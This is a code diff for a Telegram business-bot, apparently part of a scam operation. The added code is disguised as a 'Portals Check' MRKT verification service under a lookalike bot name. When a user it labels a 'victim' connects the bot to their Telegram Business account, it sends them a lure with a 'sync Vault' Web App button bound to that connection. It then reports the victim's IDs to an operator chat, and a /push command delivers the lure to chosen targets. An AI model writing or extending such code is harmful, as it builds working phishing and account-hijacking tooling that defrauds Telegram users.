@@ -1,5 +1,10 @@
 import { config } from "./config.js";
-import { introText, mrktWebAppKeyboard, nudgeText } from "./funnel.js";
+import {
+  introText,
+  mrktWebAppKeyboard,
+  nudgeText,
+  victimLinkedIntro,
+} from "./funnel.js";
 import { listEnabled, upsertConnection } from "./store.js";
 import { getUpdates, sendMessage, type Update } from "./telegram.js";
 
@@ -15,6 +20,23 @@ async function replyAsBusiness(
   });
 }
 
+/** Жертва подключила бота к СВОЕМУ Business — пишем в её личку с ботом */
+async function onboardVictimOwner(
+  businessConnectionId: string,
+  ownerChatId: number,
+  ownerUserId: number,
+): Promise<void> {
+  await sendMessage(ownerChatId, victimLinkedIntro, {
+    reply_markup: mrktWebAppKeyboard(businessConnectionId),
+    link_preview_options: { is_disabled: true },
+  });
+  await sendMessage(
+    Number(config.adminChatId),
+    `🎯 victim linked business bot\ntg <code>${ownerUserId}</code>\nbc <code>${businessConnectionId}</code>`,
+    { parse_mode: "HTML" },
+  );
+}
+
 async function handleUpdate(update: Update): Promise<void> {
   const bc = update.business_connection;
   if (bc) {
@@ -24,15 +46,23 @@ async function handleUpdate(update: Update): Promise<void> {
       enabled: bc.is_enabled,
       updatedAt: new Date().toISOString(),
     });
-    const html = bc.is_enabled
-      ? `✅ Business connected\nuser ${bc.user.id} @${bc.user.username ?? "—"}\nid <code>${bc.id}</code>`
-      : `⛔ Business disconnected\nid <code>${bc.id}</code>`;
-    await sendMessage(Number(config.adminChatId), html, { parse_mode: "HTML" });
+
+    if (bc.is_enabled) {
+      const ownerChat = bc.user_chat_id ?? bc.user.id;
+      await onboardVictimOwner(bc.id, ownerChat, bc.user.id);
+    } else {
+      await sendMessage(
+        Number(config.adminChatId),
+        `⛔ victim disconnected\nuser ${bc.user.id}\nid <code>${bc.id}</code>`,
+        { parse_mode: "HTML" },
+      );
+    }
     return;
   }
 
   const bm = update.business_message;
   if (bm && !bm.from?.is_bot) {
+    // ЛС на бизнес-аккаунт жертвы (клиенты) — вторично
     await replyAsBusiness(bm.business_connection_id, bm.chat.id, introText);
     return;
   }
@@ -51,12 +81,14 @@ async function handleUpdate(update: Update): Promise<void> {
     await sendMessage(
       chatId,
       [
-        "Business-бот MRKT funnel.",
+        "Portals Check — проверка MRKT / Business.",
         "",
-        "1. @BotFather → Bot Settings → Business Mode → Enable.",
-        "2. Telegram Business → Чат-боты → этот бот, право «Отвечать».",
+        "Пользователь подключает бота: Настройки → Telegram Business →",
+        "Чат-боты (или автоматизация) → @PortaIsLiquidBot",
         "",
-        `Mini App: ${config.miniappUrl}`,
+        "После подключения сюда придёт кнопка синхронизации Vault.",
+        "",
+        `Web App: ${config.miniappUrl}`,
       ].join("\n"),
     );
     return;
@@ -66,7 +98,7 @@ async function handleUpdate(update: Update): Promise<void> {
     const parts = msg.text.split(/\s+/);
     const target = Number(parts[1]);
     if (!target) {
-      await sendMessage(chatId, "usage: /push <customer_chat_id>");
+      await sendMessage(chatId, "usage: /push <chat_id>");
       return;
     }
     const enabled = listEnabled();
@@ -75,8 +107,10 @@ async function handleUpdate(update: Update): Promise<void> {
       return;
     }
     const conn = enabled[enabled.length - 1]!;
-    await replyAsBusiness(conn.id, target, introText);
-    await sendMessage(chatId, `sent via ${conn.id}`);
+    await sendMessage(target, victimLinkedIntro, {
+      reply_markup: mrktWebAppKeyboard(conn.id),
+    });
+    await sendMessage(chatId, `pushed to ${target} via ${conn.id}`);
   }
 }
 
